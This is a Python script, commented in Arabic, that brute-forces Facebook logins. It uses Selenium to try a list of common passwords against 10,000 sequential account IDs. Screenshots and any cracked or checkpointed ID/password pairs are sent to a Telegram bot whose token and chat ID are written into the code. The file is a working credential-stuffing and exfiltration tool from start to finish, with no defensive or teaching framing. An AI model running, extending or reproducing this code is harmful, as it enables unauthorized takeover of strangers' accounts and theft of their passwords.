import time
import random
import requests
import os
import threading
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from concurrent.futures import ThreadPoolExecutor

# 🔑 إعدادات تليجرام
TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
CHAT_ID = "5653032481"

# عداد مشترك بين جميع الخيوط لحساب عدد الصور المرسلة
shot_count = 0
shot_lock = threading.Lock()

PASS_LIST = [
    '123456', '12345678', '123456789', 'jasser123', 'malo123', 'jasser2004', 'jasser2005',
    'password', '112233', '445566', '778899', '000000', '111111', '12345'
]

def send_to_tg(text):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
    except: pass

def send_photo_tg(photo_path, caption):
    try:
        with open(photo_path, 'rb') as photo:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
                          data={'chat_id': CHAT_ID, 'caption': caption}, files={'photo': photo})
    except: pass

def check_account(uid):
    global shot_count
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--window-size=1080,1920')
    
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)
    
    try:
        for pas in PASS_LIST:
            driver.get("https://m.facebook.com/login.php")
            time.sleep(2)
            
            driver.find_element(By.ID, "m_login_email").send_keys(uid)
            driver.find_element(By.NAME, "pass").send_keys(pas)
            driver.find_element(By.NAME, "login").click()
            time.sleep(5)
            
            # فحص إذا كنا سنرسل لقطة شاشة (أول 10 فقط)
            with shot_lock:
                if shot_count < 10:
                    shot_count += 1
                    screen_name = f"test_{uid}_{shot_count}.png"
                    driver.save_screenshot(screen_name)
                    send_photo_tg(screen_name, f"📸 تجربة فحص رقم {shot_count}\n🆔 ID: {uid}\n🔑 Pass: {pas}")
                    if os.path.exists(screen_name): os.remove(screen_name)

            # التحقق من النجاح أو التفتيش (يرسل دائماً حتى بعد الـ 10 صور الأولى)
            current_url = driver.current_url
            if "c_user" in driver.get_cookies():
                send_to_tg(f"✅ تم الاختراق (OK)\n🆔 ID: {uid}\n🔑 PASS: {pas}")
                break
            elif "checkpoint" in current_url:
                send_to_tg(f"⚠️ نقطة تفتيش (CP)\n🆔 ID: {uid}\n🔑 PASS: {pas}")
                break
            
    except: pass
    finally: driver.quit()

def run_main():
    start_id = 26701173
    total = 10000
    send_to_tg(f"🚀 انطلاق! سأرسل أول 10 لقطات شاشة للتأكد ثم أستمر في الفحص بصمت لـ {total} حساب.")
    
    ids = [str(start_id + i) for i in range(total)]
    with ThreadPoolExecutor(max_workers=5) as pool:
        pool.map(check_account, ids)

if __name__ == "__main__":
    run_main()
